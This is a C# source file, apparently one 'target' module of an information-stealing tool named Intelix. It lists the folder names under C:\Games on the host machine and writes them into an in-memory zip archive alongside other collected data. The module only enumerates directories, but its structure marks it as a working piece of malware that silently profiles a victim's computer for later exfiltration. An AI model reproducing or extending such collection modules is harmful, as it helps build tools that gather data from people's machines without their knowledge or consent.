using System.Collections.Generic;
using System.IO;
using System.Linq;
using Intelix.Helper.Data;

namespace Intelix.Targets.Device;

public class GameList : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string path = "C:\\Games";
		if (Directory.Exists(path))
		{
			List<string> list = Directory.GetDirectories(path).Select(Path.GetFileName).ToList();
			if (list.Any())
			{
				zip.AddTextFile("Games.txt", string.Join("\n", list));
			}
		}
	}
}
